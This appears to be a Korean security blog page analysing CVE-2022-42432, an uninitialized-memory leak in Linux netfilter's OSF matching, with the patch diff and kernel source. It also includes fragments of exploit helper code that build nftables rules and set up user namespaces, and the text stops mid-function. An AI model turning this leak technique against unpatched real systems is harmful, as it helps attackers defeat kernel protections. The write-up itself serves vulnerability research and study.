nftnl_rule *r, uint32_t key, uint32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"meta\"); if (e == NULL) { perror(\"expr payload oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_META_KEY, key); nftnl_expr_set_u32(e, NFTNL_EXPR_META_DREG, dreg); nftnl_rule_add_expr(r, e); } static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op, const void *data, uint32_t data_len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"cmp\"); if (e == NULL) { perror(\"expr cmp oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg); nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op); nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len); nftnl_rule_add_expr(r, e); } static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t sreg, uint32_t dreg, uint32_t offset, uint32_t len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"payload\"); if (e == NULL) { perror(\"expr payload oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base); if(sreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg); if(dreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len); nftnl_rule_add_expr(r, e); } int add_verdict(struct nftnl_rule *r, int verdict, char * chain, u_int32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"immediate\"); if (e == NULL) { perror(\"expr payload oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); if(chain) nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, chain); nftnl_rule_add_expr(r, e); return 0; } void write_file(const char *filename, char *text) { int fd = open(filename, O_RDWR); write(fd, text, strlen(text)); close(fd); } void new_ns(void) { uid_t uid = getuid(); gid_t gid = getgid(); char buffer[0x100]; if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) { perror(\" [-] unshare(CLONE_NEWUSER | CLONE_NEWNS)\"); exit(EXIT_FAILURE); } if (unshare(CLONE_NEWNET)){ perror(\" [-] unshare(CLONE_NEWNET)\"); exit(EXIT_FAILURE); } write_file(\"/proc/self/setgroups\", \"deny\"); snprintf(buffer, sizeof(buffer), \"0 %d 1\", uid); write_file(\"/proc/self/uid_map\", buffer); snprintf(buffer, sizeof(buffer), \"0 %d 1\", gid); write_file(\"/proc/self/gid_map\", buffer); } #ifndef HEXDUMP_COLS #define HEXDUMP_COLS 16 #endif void hexdump(void *mem, unsigned int len) { unsigned int i, j; for(i = 0; i \u003c len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) { /* print offset */ if(i % HEXDUMP_COLS == 0) { printf(\"0x%06x: \", i); } /* print hex data */ if(i \u003c len) { printf(\"%02x \", 0xFF \u0026 ((char*)mem)[i]); } else /* end of block, just aligning for ASCII dump */ { printf(\" \"); } /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(j = i - (HEXDUMP_COLS - 1); j \u003c= i; j++) { if(j \u003e= len) /* end of block, not really printing */ { putchar(' '); } else if(isprint(((char*)mem)[j])) /* printable char */ { putchar(0xFF \u0026 ((char*)mem)[j]); } else /* other char */ { putchar('.'); } } putchar('\\n'); } } } https://youtu.be/p_VYklBtE4A Exploit\n",
  "wordCount" : "2314",
  "inLanguage": "en",
  "datePublished": "2024-03-10T00:00:00Z",
  "dateModified": "2024-03-10T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/cve-2022-42432-linux-kernel-netfilter/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      CVE-2022-42432 Linux kernel netfilter
    </h1>
    <div class="post-meta">


March 2024

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#cve-2022-42432" aria-label="CVE-2022-42432">CVE-2022-42432</a><ul>
                        
                <li>
                    <a href="#root-cause" aria-label="Root Cause">Root Cause</a></li>
                <li>
                    <a href="#leak" aria-label="Leak">Leak</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="cve-2022-42432">CVE-2022-42432<a hidden class="anchor" aria-hidden="true" href="#cve-2022-42432">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> expr_ops expr_ops_osf <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	.name		<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;osf&#34;</span>,
</span></span><span style="display:flex;"><span>	.alloc_len	<span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> nftnl_expr_osf),
</span></span><span style="display:flex;"><span>	.max_attr	<span style="color:#f92672">=</span> NFTA_OSF_MAX,
</span></span><span style="display:flex;"><span>	.set		<span style="color:#f92672">=</span> nftnl_expr_osf_set,
</span></span><span style="display:flex;"><span>	.get		<span style="color:#f92672">=</span> nftnl_expr_osf_get,
</span></span><span style="display:flex;"><span>	.parse		<span style="color:#f92672">=</span> nftnl_expr_osf_parse,
</span></span><span style="display:flex;"><span>	.build		<span style="color:#f92672">=</span> nftnl_expr_osf_build,
</span></span><span style="display:flex;"><span>	.output		<span style="color:#f92672">=</span> nftnl_expr_osf_snprintf,
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> nftnl_expr_osf {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">enum</span> nft_registers	dreg;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint8_t</span>			ttl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span>		flags;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nftnl_expr_osf_set</span>(<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e, <span style="color:#66d9ef">uint16_t</span> type,
</span></span><span style="display:flex;"><span>			      <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">uint32_t</span> data_len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr_osf <span style="color:#f92672">*</span>osf <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_data</span>(e);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span>(type) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFTNL_EXPR_OSF_DREG:
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>osf<span style="color:#f92672">-&gt;</span>dreg, data, <span style="color:#66d9ef">sizeof</span>(osf<span style="color:#f92672">-&gt;</span>dreg));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFTNL_EXPR_OSF_TTL:
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>osf<span style="color:#f92672">-&gt;</span>ttl, data, <span style="color:#66d9ef">sizeof</span>(osf<span style="color:#f92672">-&gt;</span>ttl));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFTNL_EXPR_OSF_FLAGS:
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>osf<span style="color:#f92672">-&gt;</span>flags, data, <span style="color:#66d9ef">sizeof</span>(osf<span style="color:#f92672">-&gt;</span>flags));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>nf tables에서 expr 추가하듯이 추가하면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> expr_types {
</span></span><span style="display:flex;"><span>	EXPR_INVALID,
</span></span><span style="display:flex;"><span>	EXPR_VERDICT,
</span></span><span style="display:flex;"><span>	EXPR_SYMBOL,
</span></span><span style="display:flex;"><span>	EXPR_VARIABLE,
</span></span><span style="display:flex;"><span>	EXPR_VALUE,
</span></span><span style="display:flex;"><span>	EXPR_PREFIX,
</span></span><span style="display:flex;"><span>	EXPR_RANGE,
</span></span><span style="display:flex;"><span>	EXPR_PAYLOAD,
</span></span><span style="display:flex;"><span>	EXPR_EXTHDR,
</span></span><span style="display:flex;"><span>	EXPR_META,
</span></span><span style="display:flex;"><span>	EXPR_SOCKET,
</span></span><span style="display:flex;"><span>	EXPR_OSF,
</span></span><span style="display:flex;"><span>	EXPR_CT,
</span></span><span style="display:flex;"><span>	EXPR_CONCAT,
</span></span><span style="display:flex;"><span>	EXPR_LIST,
</span></span><span style="display:flex;"><span>	EXPR_SET,
</span></span><span style="display:flex;"><span>	EXPR_SET_REF,
</span></span><span style="display:flex;"><span>	EXPR_SET_ELEM,
</span></span><span style="display:flex;"><span>	EXPR_MAPPING,
</span></span><span style="display:flex;"><span>	EXPR_MAP,
</span></span><span style="display:flex;"><span>	EXPR_UNARY,
</span></span><span style="display:flex;"><span>	EXPR_BINOP,
</span></span><span style="display:flex;"><span>	EXPR_RELATIONAL,
</span></span><span style="display:flex;"><span>	EXPR_NUMGEN,
</span></span><span style="display:flex;"><span>	EXPR_HASH,
</span></span><span style="display:flex;"><span>	EXPR_RT,
</span></span><span style="display:flex;"><span>	EXPR_FIB,
</span></span><span style="display:flex;"><span>	EXPR_XFRM,
</span></span><span style="display:flex;"><span>	EXPR_SET_ELEM_CATCHALL,
</span></span><span style="display:flex;"><span>	EXPR_FLAGCMP,
</span></span><span style="display:flex;"><span>	EXPR_MAX <span style="color:#f92672">=</span> EXPR_FLAGCMP
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">strncpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)dest, <span style="color:#e6db74">&#34;unknown&#34;</span>, NFT_OSF_MAXGENRELEN);
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> NFT_OSF_F_VERSION)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">snprintf</span>(os_match, NFT_OSF_MAXGENRELEN, <span style="color:#e6db74">&#34;%s:%s&#34;</span>,
</span></span><span style="display:flex;"><span>				 data.genre, data.version);
</span></span></code></pre></div><p>flags에는 NFT_OSF_F_VERSION을 세팅해줘야 더 많이 복사가 된다?</p>
<h2 id="root-cause">Root Cause<a hidden class="anchor" aria-hidden="true" href="#root-cause">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nfnetlink_osf.c b<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nfnetlink_osf.c
</span></span><span style="display:flex;"><span>index <span style="color:#ae81ff">0f</span>a2e2030427..ee6840bd5933 <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nfnetlink_osf.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nfnetlink_osf.c
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">269</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">269</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span>  <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">nf_osf_find</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb,
</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">struct</span> nf_osf_hdr_ctx ctx;
</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> tcphdr <span style="color:#f92672">*</span>tcp;
</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">struct</span> tcphdr _tcph;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>	<span style="color:#66d9ef">bool</span> found <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> 	<span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>ctx, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(ctx));
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">283</span>,<span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">284</span>,<span style="color:#ae81ff">11</span> <span style="color:#960050;background-color:#1e0010">@@</span>  <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">nf_osf_find</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb,
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> 		data<span style="color:#f92672">-&gt;</span>genre <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>genre;
</span></span><span style="display:flex;"><span> 		data<span style="color:#f92672">-&gt;</span>version <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>version;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>		found <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span> 		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span> 	}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>	<span style="color:#66d9ef">return</span> found;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">EXPORT_SYMBOL_GPL</span>(nf_osf_find);
</span></span></code></pre></div><p>nf_osf_find 함수가 항상 true를 리턴해서 초기화되지 않은 영역을 릭할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">nf_osf_find</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb,
</span></span><span style="display:flex;"><span>		 <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>nf_osf_fingers,
</span></span><span style="display:flex;"><span>		 <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> ttl_check, <span style="color:#66d9ef">struct</span> nf_osf_data <span style="color:#f92672">*</span>data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> iphdr <span style="color:#f92672">*</span>ip <span style="color:#f92672">=</span> <span style="color:#a6e22e">ip_hdr</span>(skb);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nf_osf_user_finger <span style="color:#f92672">*</span>f;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> opts[MAX_IPOPTLEN];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nf_osf_finger <span style="color:#f92672">*</span>kf;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nf_osf_hdr_ctx ctx;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> tcphdr <span style="color:#f92672">*</span>tcp;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> tcphdr _tcph;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>ctx, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(ctx));
</span></span><span style="display:flex;"><span>	tcp <span style="color:#f92672">=</span> <span style="color:#a6e22e">nf_osf_hdr_ctx_init</span>(<span style="color:#f92672">&amp;</span>ctx, skb, ip, opts, <span style="color:#f92672">&amp;</span>_tcph);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>tcp)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">list_for_each_entry_rcu</span>(kf, <span style="color:#f92672">&amp;</span>nf_osf_fingers[ctx.df], finger_entry) {
</span></span><span style="display:flex;"><span>		f <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>kf<span style="color:#f92672">-&gt;</span>finger;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">nf_osf_match_one</span>(skb, f, ttl_check, <span style="color:#f92672">&amp;</span>ctx))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>		data<span style="color:#f92672">-&gt;</span>genre <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>genre;
</span></span><span style="display:flex;"><span>		data<span style="color:#f92672">-&gt;</span>version <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>version;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EXPORT_SYMBOL_GPL</span>(nf_osf_find);
</span></span></code></pre></div><p>nf_osf_fingers를 돌면서 kf에 값을 할당한뒤, match하는지 확인한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nft_osf_eval</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_expr <span style="color:#f92672">*</span>expr, <span style="color:#66d9ef">struct</span> nft_regs <span style="color:#f92672">*</span>regs,
</span></span><span style="display:flex;"><span>			 <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_pktinfo <span style="color:#f92672">*</span>pkt)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nft_osf <span style="color:#f92672">*</span>priv <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_expr_priv</span>(expr);
</span></span><span style="display:flex;"><span>	u32 <span style="color:#f92672">*</span>dest <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>regs<span style="color:#f92672">-&gt;</span>data[priv<span style="color:#f92672">-&gt;</span>dreg];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb <span style="color:#f92672">=</span> pkt<span style="color:#f92672">-&gt;</span>skb;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> os_match[NFT_OSF_MAXGENRELEN <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> tcphdr <span style="color:#f92672">*</span>tcp;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nf_osf_data data;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> tcphdr _tcph;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pkt<span style="color:#f92672">-&gt;</span>tprot <span style="color:#f92672">!=</span> IPPROTO_TCP) {
</span></span><span style="display:flex;"><span>		regs<span style="color:#f92672">-&gt;</span>verdict.code <span style="color:#f92672">=</span> NFT_BREAK;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	tcp <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_header_pointer</span>(skb, <span style="color:#a6e22e">ip_hdrlen</span>(skb),
</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> tcphdr), <span style="color:#f92672">&amp;</span>_tcph);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>tcp) {
</span></span><span style="display:flex;"><span>		regs<span style="color:#f92672">-&gt;</span>verdict.code <span style="color:#f92672">=</span> NFT_BREAK;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>tcp<span style="color:#f92672">-&gt;</span>syn) {
</span></span><span style="display:flex;"><span>		regs<span style="color:#f92672">-&gt;</span>verdict.code <span style="color:#f92672">=</span> NFT_BREAK;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">nf_osf_find</span>(skb, nf_osf_fingers, priv<span style="color:#f92672">-&gt;</span>ttl, <span style="color:#f92672">&amp;</span>data)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">strncpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)dest, <span style="color:#e6db74">&#34;unknown&#34;</span>, NFT_OSF_MAXGENRELEN);
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> NFT_OSF_F_VERSION)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">snprintf</span>(os_match, NFT_OSF_MAXGENRELEN, <span style="color:#e6db74">&#34;%s:%s&#34;</span>,
</span></span><span style="display:flex;"><span>				 data.genre, data.version);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">strlcpy</span>(os_match, data.genre, NFT_OSF_MAXGENRELEN);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">strncpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)dest, os_match, NFT_OSF_MAXGENRELEN);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>무조건 true가 리턴되기 때문에 data 부분 릭 가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">nf_osf_match_one</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb,
</span></span><span style="display:flex;"><span>			     <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nf_osf_user_finger <span style="color:#f92672">*</span>f,
</span></span><span style="display:flex;"><span>			     <span style="color:#66d9ef">int</span> ttl_check,
</span></span><span style="display:flex;"><span>			     <span style="color:#66d9ef">struct</span> nf_osf_hdr_ctx <span style="color:#f92672">*</span>ctx)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> __u8 <span style="color:#f92672">*</span>optpinit <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>optp;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> check_WSS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fmatch <span style="color:#f92672">=</span> FMATCH_WRONG;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> foptsize, optnum;
</span></span><span style="display:flex;"><span>	u16 mss <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
